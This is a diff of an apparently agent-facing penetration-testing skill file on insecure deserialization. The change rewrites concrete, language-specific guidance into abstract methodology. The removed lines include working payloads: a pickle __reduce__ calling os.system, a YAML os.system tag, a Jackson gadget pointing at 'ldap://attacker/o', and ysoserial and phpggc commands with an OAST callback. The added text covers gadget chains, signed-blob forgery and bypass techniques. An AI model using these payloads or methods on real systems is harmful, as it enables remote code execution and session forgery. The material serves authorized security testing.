@@ -1,190 +1,199 @@
 ---
 name: insecure-deserialization
-description: Insecure deserialization testing for Java, Python, PHP, .NET, Ruby, and Node.js covering gadget chains, type confusion, and safe validation
+description: Insecure deserialization testing across runtime languages covering gadget chains, type confusion, interpolation-triggered remote lookup, and safe validation
 metadata:
-  version: '1.0'
+  version: 1.0.0
 ---
 
 # Insecure Deserialization
 
-Insecure deserialization passes attacker-controlled byte streams or structured blobs to language-native unmarshal functions, enabling remote code execution, authentication bypass, and logic manipulation through magic methods and gadget chains. Test any endpoint accepting serialized objects, session blobs, or opaque binary tokens.
+Insecure deserialization passes attacker-controlled byte streams or structured blobs to a native unmarshal function, enabling remote code execution, authentication bypass, and logic manipulation through lifecycle hooks and gadget chains. Test any endpoint accepting serialized objects, session blobs, or opaque binary tokens. Interpolated references reach the same outcome without any blob, so the class also covers a reference value the runtime resolves into a remote load.
 
 ## Attack Surface
 
-**Formats**
-- Java: Java native serialization, XStream, JSON → object mappers (Jackson, Fastjson), YAML (SnakeYAML)
-- Python: `pickle`, `yaml.load` (unsafe), `marshal`, shelve
-- PHP: `unserialize()`, Phar deserialization
-- .NET: `BinaryFormatter`, `Json.NET TypeNameHandling`, ViewState
-- Ruby: `Marshal.load`, YAML.load
-- Node.js: `node-serialize`, `unserialize.js` (less common; see prototype_pollution for merge bugs)
+**Format families**
+- **Type-tagged binary object graphs**: where the decoder resolves a class or type name carried in the stream.
+- **Text formats with explicit type tags**: resolved by polymorphic document mappers.
+- **Self-executing encodings**: which run code during the decode itself by design.
+- **Integrity-gated state blobs**: session carriers, view-state style tokens, and stored descriptors.
+- **Wrapper-triggered implicit deserialization**: where a path reference causes a metadata read.
+- **Interpolation and lookup sinks**: ordinary fields whose value the runtime resolves as a lookup directive, fetching a remote class or resource with no serialized blob in play.
+- **Nested envelopes**: compressed and encoded layers around any of the above.
 
-**Input Locations**
-- Cookies, session tokens, hidden form fields
-- API parameters (`data`, `state`, `object`, base64 blobs)
-- Message queues, WebSocket binary frames, file uploads
-- Cache entries, database columns storing serialized objects
+**Input locations**
+- **Request-borne carriers**: cookies, session carriers, hidden form fields.
+- **API parameters**: carrying opaque or encoded blobs.
+- **Transport carriers**: message queues, socket frames, uploaded files.
+- **Stored carriers**: cache entries and stored columns holding serialized values.
 
 ## Reconnaissance
 
-**Detection Signals**
-- Base64 blobs starting with magic bytes:
-  - Java: `ac ed 00 05` (hex `rO0` base64)
-  - PHP: `O:`, `a:`, `s:` prefixes after decode
-  - .NET BinaryFormatter: starts with `00 01 00 00 00 ff ff ff ff`
-- `Content-Type` with binary or custom serialization
-- Framework indicators: Java apps with Spring, Struts, JSF; PHP with Symfony sessions
+### Shape Fingerprinting
 
-**White-Box Indicators**
-```
-pickle.loads    unserialize(    ObjectInputStream    BinaryFormatter
-yaml.load       readObject(     TypeNameHandling    Marshal.load
-```
+- **Blob decoding**: decode candidate blobs and note the leading bytes or prefixes that mark a format family.
+- **Content-type recording**: record the content type and any custom serialization declaration on the request.
+- **Stack indicators**: note stack indicators that identify the runtime family behind the endpoint.
+- **Signature reference**: see `references/deserialization-signatures.md` for the marker shapes behind each format family.
+
+### Unmarshal Sink Discovery
+
+- **Entry-point tracing**: trace every unmarshal entry point in the codebase back to its input source.
+- **Sink listing**: list the sinks reachable from user-influenced data: parameter decoders, session loaders, message consumers, file-operation paths.
+- **Interpolation sinks**: list interpolation and lookup sinks that resolve a reference value into a remote load, beside the byte-stream decoders.
+- **Integrity-check placement**: note which sinks run behind an integrity check and which accept unsigned input.
+
+### Trigger Mapping
+
+- **Trigger timing**: for each sink, note whether the decode happens during the request or later, in a batch worker or a file operation.
+- **Plant storage**: record where a planted blob can be stored before the trigger fires.
+
+## Detection Channels
+
+- **Magic-byte prefixes on decoded blobs**: confirm a native graph format is in play.
+- **Stack indicators**: confirm the unmarshaller family behind the endpoint.
+- **White-box unmarshal sink names**: confirm the exact decode entry point.
+- **Stack traces naming graph-resolution failures**: confirm attacker bytes reach the resolver.
+- **No-exec callback or delay oracles**: confirm live deserialization before any effect payload is sent.
+- **Tamper-rejection responses**: confirm a verifier evaluates the binding before rehydration.
+- **Unsigned-fallback acceptance**: confirms a keyless path exists beside the signed one.
+- **Re-signed blob acceptance**: confirms a recovered or guessed secret binds correctly.
+- **Local re-verification success**: predicts server acceptance before the minted blob is sent.
+- **Claim-reflecting behaviour after acceptance**: confirms the forged state took effect.
+- **Delayed callbacks**: confirm a planted blob rehydrated after the submission interaction closed.
+- **Timing correlation between plant, trigger, and callback**: attributes the effect to the paired loci.
+- **File-operation trigger signals**: confirm a path reference reached implicit deserialization.
+- **Job and administrative invocation records**: confirm the trigger ran after the plant landed.
+- **Lookup-resolution receipt**: an outbound name-resolution or fetch receipt tied to a crafted field value, which confirms an interpolated reference reached a remote loader.
+- **Response-class differential**: binding-failure text beside state-invalid text, which separates a rejected binding from a rejected payload shape.
+
+## Adversarial Capabilities
+
+- **Prerequisites**: deserialization testing presupposes control over the input bytes, knowledge of the decode path, and a callback destination, and it consumes all three.
+- **Blob crafting**: craft and encode blobs by hand, including nested envelopes around a payload.
+- **Sink reach**: reach a sink that runs during or after the request, and store a blob where a later trigger reads it.
+- **No-effect oracle**: run a no-effect oracle first: a callback or delay that proves the decode happens.
+- **Error reading**: read stack traces and rejection text to orient the next mutation.
+- **Second principal**: hold a second principal where the forged state controls identity or role.
+- **Lookup hosting**: host a reachable lookup target that serves the attacker's class or records the resolution, where an interpolation sink is in play.
+- **Runtime matching**: match the runtime and library inventory of the target before assembling a chain.
+
+## Trust Assumptions
+
+- **The agreement**: the class rests on one agreement: every blob reaching a decoder is data, and the decoder instantiates only types the application itself would have produced. The agreement holds the stream free of attacker-chosen type names, holds lifecycle hooks to unreachable code paths, holds the decoder to an allow-list of types rather than the full runtime, and holds the blob to an integrity binding the attacker cannot mint. Sensitive position leaks when any clause fails: the decoder resolves a type the attacker named, a hook runs during rehydration, or an unsigned path bypasses the binding.
+- **The failing clause**: each variant breaks one clause: the type-resolution clause, the integrity clause, or the timing clause.
 
 ## Key Vulnerabilities
 
-### Java Deserialization
+### Native Object-Graph Chains
 
-**Gadget Chains**
-- Commons Collections, Commons BeanUtils, Spring, Groovy, Rome, JDK-only chains (varies by classpath)
-- Tools: ysoserial (authorized testing only), manual chain selection by classpath
+- **Attacker-named types**: the decoder resolves attacker-named types and then runs lifecycle hooks, which reach into libraries already on the classpath.
+- **Chain selection**: chain selection depends on the runtime inventory; enumerate it before assembling.
+- **Test flow**: confirm the sink, fingerprint the library inventory from errors and bundled artifacts, then deliver a callback-first payload.
 
-**Test Flow**
-1. Confirm deserialization sink (HTTP param, cookie, RMI, JMX if exposed)
-2. Fingerprint library versions from errors, headers, or bundled libs
-3. Generate gadget payload for available chain; expect DNS/HTTP callback or command execution
+### Self-Executing Encodings
 
-**Jackson / JSON Typing**
-```json
-["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o", "autoCommit":true}]
-```
-When `enableDefaultTyping` or `@JsonTypeInfo` allows attacker-chosen types.
+- **Decode-time execution**: some encodings execute code during decode by design; any input reaching them is effectively execution.
+- **Safe-oracle first**: a callback or delay confirms the sink before an effect payload is sent.
 
-### Python Pickle
+### Type-Tagged Documents
 
-Pickle executes arbitrary code during unpickling by design:
-```python
-import pickle, os, base64
-class Exploit:
-    def __reduce__(self):
-        return (os.system, ('id',))
-# base64 encode pickle.dumps(Exploit()) and send as cookie/param
-```
+- **Polymorphic mappers**: polymorphic document mappers instantiate the type named in the document when typing is enabled.
+- **Constructor side effects**: attacker-chosen type names reach constructors and setters that perform side effects.
+- **Enablement flag**: enablement is often a single configuration flag, so test the flag before the payload.
 
-**YAML**
-```yaml
-!!python/object/apply:os.system ['id']
-```
-When `yaml.load` used instead of `yaml.safe_load`.
+### Lifecycle-Hook Object Injection
 
-### PHP unserialize()
+- **Rehydration hooks**: rehydration hooks run on the decoded object: wake-up, destructor, string-conversion, and call hooks carry effects.
+- **Reachable classes**: chains assemble from classes already reachable in the application's dependencies.
+- **External-resource graphs**: object graphs that reference external resources turn the hook into a fetch or a file read.
 
-**Object Injection**
-- Magic methods: `__wakeup`, `__destruct`, `__toString`, `__call`
-- POP chains through framework classes (Laravel, Symfony, WordPress plugins)
+### Integrity-Gated State Blobs
 
-**Phar Deserialization**
-- Upload or reference `phar://` wrapper triggering metadata deserialization on file operations
+- **Weak verification**: integrity checks with disabled verification, weak keys, or a keyless fallback path let forged state verify.
+- **Secret recovery**: recovery of the signing secret lets the attacker mint any state the verifier trusts.
+- **Typed state carriers**: typed state carriers often control identity or role directly, which makes the forged claim the whole finding.
 
-### .NET Deserialization
+### Wrapper-Triggered Implicit Deserialization
 
-**BinaryFormatter / LosFormatter**
-- Never safe on untrusted input; full RCE with known gadget chains (ysoserial.net)
+- **Wrapper-scheme path reference**: a path reference that names a wrapper scheme causes a metadata read, which deserializes during a file operation.
+- **File-operation trigger**: the trigger is any file operation: existence check, size read, copy, or upload.
+- **Uploadable blob**: the blob itself can be uploaded or stored as an ordinary file.
 
-**Json.NET**
-```json
-{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework", ...}
-```
-When `TypeNameHandling` != `None`.
+### Interpolation-Triggered Remote Lookup
 
-**ViewState**
-- MAC disabled or weak machine keys → forge deserialized view state
-
-### Ruby Marshal
-
-- `Marshal.load` on user input → gadget chains in Rails/Devise versions (context-dependent)
+- **Reference in an ordinary field**: a string carrying a lookup directive in a field the runtime interpolates, such as a logged value or a templated name, causes a remote resolution and a class load with no serialized blob in play.
+- **Remote basis fetch**: the resolved reference names attacker-controlled material over a resolution protocol, so the loader fetches and instantiates it inside the application's own process.
+- **No chain required**: this path needs no gadget inventory, so test it beside the byte-stream decoders rather than after them.
+- **Procedure ownership**: the parent byte-stream description cannot cover a reference-triggered load, so this block owns the interpolation procedure while the object-graph variants stay disjoint.
 
 ## Advanced Techniques
 
 **Signed Blob Bypass**
-- If HMAC/signing uses weak secret or algorithm confusion, forge serialized payload
-- Strip signature and test unsigned code paths
-- Length extension on MAC if applicable (older custom schemes)
+- **Weak-secret forging**: where the integrity binding uses a weak secret or an ambiguous algorithm, forge the blob.
+- **Binding stripping**: strip the binding and test keyless code paths.
+- **Length extension**: length extension on a simple checksum scheme where the construction allows it.
 
 **Second-Order Deserialization**
-- Store serialized blob in profile/import; trigger on admin export, cache warm, or batch job
+- **Store then trigger**: store the blob in a stored field or import, then let an export, cache warm, or batch job trigger the decode.
+- **Attribution**: plant and trigger are separate interactions, so attribute the effect by timing and correlation.
 
-**Compression Wrappers**
-- Gzip/base64 nested encoding bypassing naive WAF inspection
+**Nested Envelopes**
+- **Layer bypass**: compression and encoding layers wrapped around the blob bypass naive content inspection.
+- **Ordered decoding**: each layer is decoded in order at the target, so the payload survives intact.
+
+## Bypass Techniques
+
+- **Alternative parameters**: alternative parameters that store the same session value, where some paths decode without the check.
+- **Content-type switching**: switching the content type or the parameter location between requests.
+- **Type confusion**: an array versus an object body reaches different decoder branches.
+- **Allow-list assembly**: defeat a type allow-list by assembling the chain from types the list still admits, and treat a decoder that admits only primitive structures as the closing control.
+- **Family handoff**: name the defence-bypass family at the encoding and framing steps for stacked layers and length-field smuggling, rather than restating those mechanics here.
+- **Extended reading**: when this section does not fulfil the knowledge gap, extend the reading with the defence-bypass and proxy-techniques families.
+
+## Chaining Attacks
+
+- **Deserialization plus execution**: the decode runs attacker-controlled code with the application's privileges.
+- **Deserialization plus authorization bypass**: a forged signed state carrier mints identity or role claims.
+- **Deserialization plus deferred trigger**: the planted blob detonates in an administrative export or batch job.
+- **Deserialization plus file operations**: a wrapper path turns an ordinary read into a decode.
+- **Interpolation lookup plus a fetch or a load**: name the ssrf skill where the resolution basis travels over a fetch, and the rce family where the loaded material executes.
 
 ## Testing Methodology
 
-1. **Find sinks** — Locate decode/unmarshal calls on user-influenced data
-2. **Confirm format** — Magic bytes, error stack traces, framework fingerprint
-3. **Safe oracle** — DNS/HTTP OAST callback or sleep/ping before full RCE PoC
-4. **Gadget selection** — Match classpath/runtime version to available chains
-5. **Minimal PoC** — Demonstrate code execution or critical logic bypass with least destructive command
-6. **Session/cookie focus** — Deserialize server-side session stores (Java, PHP) early
+1. **Find sinks** - Locate decode and unmarshal calls on user-influenced data, including interpolation and lookup sinks that resolve a reference value into a remote load
+2. **Confirm format** - Leading bytes, error stack traces, and stack fingerprints
+3. **Safe oracle** - A callback or delay before any effect payload, or a lookup-resolution receipt where the sink is interpolation-driven
+4. **Chain selection** - Match the runtime and library inventory to an available chain
+5. **Minimal proof** - Demonstrate execution or a critical logic bypass with the least destructive effect
+6. **Session focus** - Decode server-side session carriers early, since they are the highest-value sink
 
-## Validation
+See `references/deserialization-oracle.md` for the oracle classes and the bounded-effect discipline behind the safe-oracle step.
 
-1. Demonstrate attacker-controlled object graph reaches dangerous sink (unmarshal/readObject)
-2. Show impact: RCE (bounded command), auth bypass object, or privilege field manipulation
-3. Provide encoded payload and exact injection point (cookie name, parameter, header)
-4. Confirm on fixed version or alternate instance that identical payload fails safely
-5. Document library/version and gadget chain class names for remediation
+## Variants
+
+- deserialization-gadget-chain - Unsigned object graphs reaching native unmarshallers, where type-tagged values resolve attacker-named types or self-executing encodings run at decode time.
+- deserialization-signed-forgery - Signature-gated state blobs, where the binding is weakly protected, an unsigned fallback path exists, or mintable claims control identity and role.
+- deserialization-deferred-trigger - Stored blobs rehydrated later, including plantable storage read by a later job and wrapper path references consumed by file operations.
 
 ## False Positives
 
-- Base64 data is encrypted or signed with verified HMAC before deserialization
-- Only primitive types deserialized (whitelist schema, no polymorphic types)
-- `pickle`/`Marshal` not used; JSON parsed to dict without object instantiation
-- Deserialization in isolated sandbox with no network/exec primitives (verify thoroughly)
-- Error mentions serialization class but input is never passed to unmarshal (dead code path)
-
-## Bypass Methods
-
-- Encoding layers: base64 → gzip → serialize
-- Alternative parameters storing same session (`session`, `session_backup`, `state`)
-- Switch content-type or parameter location (GET vs POST vs cookie)
-- Type confusion: JSON array vs object hitting different deserializer branches
-- Unicode/UTF-7 smuggling in PHP serialized strings (legacy contexts)
-
-## Impact
-
-- Remote code execution on application servers
-- Authentication bypass via forged session objects
-- Privilege escalation through manipulated role/admin fields in deserialized classes
-- Full application compromise in Java/PHP/.NET stacks with known gadget libraries
+- **Sound integrity checks**: blobs verified by a sound integrity check before deserialization.
+- **Primitive-only decoding**: only primitive values decoded, with no polymorphic types and no object instantiation.
+- **Plain-map parsing**: inputs parsed into plain maps without object construction.
+- **Isolated sandbox**: deserialization inside an isolated sandbox with no network or execution primitives, verified thoroughly.
+- **Dead-path error text**: error text naming a serialization class where the input never reaches the unmarshal call (dead path).
+- **Local-only resolution**: an interpolated reference that resolves to a local constant or a disabled loader, with no remote fetch and no class load.
 
 ## Pro Tips
 
-1. Always fingerprint versions before firing ysoserial — wrong chain wastes time and noise
-2. Start with DNS/HTTP callback gadgets before command execution in production-like targets
-3. Check cookies named `JSESSIONID` alternatives, `.ASPXAUTH`, `laravel_session`, custom tokens
-4. In white-box, trace from `readObject`/`unserialize`/`pickle.loads` backward to source
-5. ViewState MAC off is still common on legacy ASP.NET — test early on `.aspx` apps
-
-## Tooling
-
-Payload generation is the practitioner's core tool here. The sandbox has `git`/`python`/`go` and **interactsh-client** (OAST); add a JRE or `php-cli` if you need the Java/PHP generators.
-
-| Tool | Language / format | Use |
-|------|-------------------|-----|
-| **ysoserial** (frohoff) | Java native | Gadget-chain payloads: `CommonsCollections1-7`, `Groovy1`, `Spring1/2`, and `URLDNS` for a safe no-exec DNS oracle. Needs a JRE. |
-| **phpggc** (ambionics) | PHP `unserialize` / Phar | Framework POP chains (Laravel, Symfony, WordPress, Drupal, Monolog). Needs `php-cli`. |
-| **ysoserial.net** | .NET `BinaryFormatter` / Json.NET | Windows/.NET gadget payloads. Needs .NET/mono — usually out of scope in a Linux sandbox. |
-
-```
-# Java: prove the sink with a no-exec DNS oracle BEFORE any RCE chain
-java -jar ysoserial.jar URLDNS "http://$(interactsh-client -json | jq -r .host)" | base64 -w0
-
-# PHP: generate a Laravel POP chain (base64), fast path via a framework gadget
-./phpggc -b Laravel/RCE9 system id
-```
-
-Confirm the sink with a callback (`URLDNS` / interactsh OAST) before firing a command-exec chain, and match the chain to the fingerprinted library version — the wrong chain just adds noise.
+- **Runtime fingerprinting**: fingerprint the runtime inventory before attempting a chain; the wrong chain wastes time and creates noise.
+- **Callback-first**: start with callback or delay gadgets before effect payloads on production-like targets.
+- **Session carriers first**: decode session carriers early; they are both the likeliest sink and the highest-value claim.
+- **Backward tracing**: in white-box work, trace from the unmarshal call backwards to its input source.
+- **Legacy verification**: integrity verification disabled on legacy deployments is still common; test it early.
+- **Bounded proof**: keep the proof bounded and reversible, and stop at the first confirmed decode or claim.
+- **Interpolation separation**: test interpolation and lookup sinks separately from byte-stream decoders; they carry no object graph and need no chain inventory.
 
 ## Summary
 
-Treat every deserialization of untrusted data as critical. Safe patterns use JSON schema validation without type polymorphism, `yaml.safe_load`, signed encrypted tokens, or no custom serialization at all. Prove impact with callback or bounded execution — not just error stack traces.
+Treat every deserialization of untrusted data as critical. Safe patterns validate a schema without type polymorphism, resolve no attacker-named types, verify an integrity binding before decode, keep lifecycle hooks unreachable from decoded data, and resolve no attacker-named reference in an interpolated field. Prove impact with a callback or a bounded effect, not with an error stack trace alone.
